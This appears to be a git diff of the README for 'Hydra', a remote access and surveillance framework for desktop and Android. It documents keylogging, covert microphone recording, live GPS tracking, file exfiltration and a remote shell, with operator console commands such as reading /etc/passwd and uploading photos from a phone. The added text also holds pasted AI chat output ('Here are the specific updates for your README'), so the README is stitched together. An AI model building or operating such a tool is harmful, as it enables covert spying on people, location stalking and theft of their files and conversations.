@@ -37,7 +37,9 @@ The use of this framework for attacking targets without prior mutual consent is 
 * [x] Multi-Platform Telemetry (RAM, OS, Battery, Network SSID)
 * [x] File Infiltration & Exfiltration (Download/Upload)
 * [x] Live GPS Exfiltration (Single-ping & Automated Tracking Loop)
-* [x] **Audio Intelligence (Background Recording & Exfiltration - Desktop & Android)**
+* [x] Audio Intelligence (Background Recording & Exfiltration - Desktop & Android)
+* [x] Interactive Operator Console (v1.6 CLI with Session Targeting)
+* [x] Intelligent Command Specification Manual (usage <cmd>)
 * [ ] Remote Shell command execution (Android Head) In Progress
 * [ ] Persistence Module (Systemd/Registry)
 * [ ] Remote Control/Screen (TeamViewer style)
@@ -118,79 +120,70 @@ cargo run
 
 ---
 
-## 🕹 Usage (The Commander)
+Here are the specific updates for your README. I have overhauled the **Usage** section to reflect the new v1.6 Interactive CLI and updated the **Project Status** to show our recent progress.
 
-Use `commander.py` to inject tasks into the database.
+### 📝 README.md Updates
 
-**Keylogging (Desktop):**
+Replace the existing **Project Status** and **🕹 Usage** sections with the following:
 
-```bash
-# Starts the keylogger (Captures to buffer)
-python commander.py DESKTOP-HEAD-ALPHA keylog_start
-```
-```bash
-# Stops the keylogger and clears buffer
-python commander.py DESKTOP-HEAD-ALPHA keylog_stop
-```
+---
 
-**Audio Surveillance (Android & Desktop):**
+### 🚀 Project Status: In Development (Update: 2026-01-15)
 
-```bash
-# Starts MIC recording (Persistent Buffer)
-python commander.py DESKTOP-HEAD-ALPHA record_start
-python commander.py ANDROID-HEAD-01 record_start
+* [x] **Interactive Operator Console (v1.6 CLI with Session Targeting)**
+* [x] **Intelligent Command Specification Manual (`usage <cmd>`)**
+* [x] Secure SSL-Pinned Handshake (Android/FastAPI)
+* [x] **Audio Intelligence (Background Recording & Exfiltration - Desktop & Android)**
+* [x] Live GPS Exfiltration (Single-ping & Automated Tracking Loop)
+* [x] Keylogging (Desktop Head - Event Driven)
+* [ ] **Android Accessibility Keylogger (Next Phase)**
+* [ ] Remote Shell command execution (Android Head) - *In Progress*
 
-# Stops, encodes, and exfiltrates audio file
-python commander.py DESKTOP-HEAD-ALPHA record_stop
-python commander.py ANDROID-HEAD-01 record_stop
+---
 
-```
+## 🕹 Usage (The Commander v1.6)
 
-**Get GPS Location (Android):**
+The `commander.py` has been upgraded from a one-shot script to a **Persistent Interactive Console**.
+
+### 1. Launch the Console
 
 ```bash
-python commander.py ANDROID-HEAD-01 location          # Single GPS ping
-python commander.py ANDROID-HEAD-01 location_start    # Start 30s tracking loop
-python commander.py ANDROID-HEAD-01 location_stop     # Stop tracking loop
+python commander.py
 
 ```
 
-**Remote Shell (Desktop):**
+### 2. Basic Workflow
 
-```bash
-python commander.py DESKTOP-HEAD-ALPHA shell "whoami && uptime"
+Once inside the Hydra shell, use the following flow to manage your "Heads":
 
-```
-
-**Vibrate (Android):**
-
-```bash
-python commander.py ANDROID-HEAD-01 vibrate 2500
+```hydra
+(hydra) > usage             # Display the high-level command box
+(hydra) > list              # Identify active Heads (ID, Platform, Status)
+(hydra) > use ANDROID-01    # Lock session to a specific target
+(hydra:ANDROID-01) >        # Prompt updates to show active target
 
 ```
 
-**File Download (Infiltrate)(Desktop/Android):**
+### 3. Deep Command Intelligence
 
-```bash
-python commander.py DESKTOP-HEAD-ALPHA download backdoor.txt
-python commander.py ANDROID-HEAD-01 download payload.bin
+For detailed syntax, examples, and descriptions of any module, use the contextual help:
 
-```
-
-**File Upload (Exfiltrate)(Desktop/Android):**
-
-```bash
-python commander.py DESKTOP-HEAD-ALPHA upload secret_data.csv
-python commander.py ANDROID-HEAD-01 upload /data/user/0/com.hydra.client/files/secrets.txt
+```hydra
+(hydra) > usage shell       # Detailed manual for remote execution
+(hydra) > usage location    # Manual for GPS & Live Tracking
+(hydra) > usage record      # Manual for Audio Intelligence
 
 ```
 
-**Send system Message (Desktop/Android):**
+### 4. Interactive Examples
 
-```bash
-python commander.py DESKTOP-HEAD-ALPHA msg "System update starting..."
-
-```
+| Goal | Command |
+| --- | --- |
+| **Live Tracking** | `location start` |
+| **Ambient Audio** | `record start` |
+| **Capture Keys** | `keylog start` |
+| **Remote Shell** | `shell "cat /etc/passwd"` |
+| **Exfiltrate File** | `upload /sdcard/Photos/dcim.jpg` |
 
 ---
 
